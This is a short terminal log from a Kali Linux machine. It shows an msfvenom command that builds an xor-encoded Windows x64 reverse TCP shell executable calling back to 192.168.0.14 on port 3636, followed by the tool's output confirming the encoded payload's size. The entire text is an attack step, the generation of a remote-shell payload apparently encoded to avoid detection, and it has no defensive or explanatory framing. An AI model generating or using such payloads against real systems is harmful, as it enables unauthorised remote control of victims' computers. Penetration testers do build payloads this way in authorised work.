root@kali2:/opt/metasploit-framework/bin/payloads/pe_shells# msfvenom -a x64 --platform windows -p windows/x64/shell_reverse_tcp LHOST=192.168.0.14 LPORT=3636 -e x64/xor -f exe-only > x64rev_tcp_xor.exe
Found 1 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 503 (iteration=0)
x64/xor chosen with final size 503
Payload size: 503 bytes
Final size of exe-only file: 6144 bytes
